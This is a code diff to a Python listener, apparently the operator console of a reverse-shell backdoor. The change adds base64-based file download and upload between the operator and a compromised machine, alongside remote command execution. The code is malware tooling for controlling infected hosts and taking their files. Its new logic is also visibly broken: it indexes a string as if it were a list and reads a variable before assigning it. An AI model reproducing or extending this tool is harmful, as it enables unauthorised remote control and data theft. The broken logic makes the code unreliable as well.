@@ -1,5 +1,6 @@
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -38,19 +39,29 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful"
+
+    def read_file(self, path):
+        with open(path, 'rb')as file:
+            return base64.b64encode(file.read())
 
     def run(self):
         try:
             while True:
                 command = str(input(">> "))
+
+                try:
+                    if command[0] == "download":
+                        print(f"[+] Downloading file as {command[1]}")
+                        result = self.write_file(command[1], result)
+                    if command[0] == "upload" and "[-] Error" not in result:
+                        file_content = self.read_file(command[1])
+                        command.append(file_content)
+                except Exception:
+                    result = "[-] Error during comand execution ::Srver::"
+
                 result = self.execute_remotely(command)
-
-                if command[0] == "download":
-                    print("test d")
-                    result = self.write_file(command[1], result)
-
                 print(result)
         except KeyboardInterrupt:
             print("\n[-] Quiting")
